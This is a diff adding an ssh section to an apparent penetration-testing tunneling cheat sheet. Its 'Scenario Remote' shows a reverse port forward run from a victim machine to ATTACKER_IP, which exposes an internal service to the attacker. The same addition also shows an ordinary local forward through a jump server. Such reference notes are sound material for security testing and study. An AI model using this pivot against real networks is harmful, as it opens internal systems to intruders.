@@ -158,6 +158,19 @@ public class RuntimeDemo {
 # Tunnel a connection from a local TCP port to a remote service
 socat -v tcp4-listen:8000,reuseaddr,fork tcp4:10.10.12.15:80 
 ```
+## ssh
+
+**Scenario Remote**: I'm on the victim machine and want to expose an internal port of that machine to my attacker machine:
+```sh
+ssh -l attacker ATTACKER_IP -R8088:127.0.0.1:8080
+```
+Now on my attacker machine, I can just navigate to http://127.0.0.1:8088
+
+**Scenario Local**: This example opens a connection to the gw.example.com jump server, and forwards any connection to port 80 on the local machine to port 80 on intra.example.com.
+
+```sh
+ssh -L 80:intra.example.com:80 gw.example.com
+```
 
 ## Powershell
 
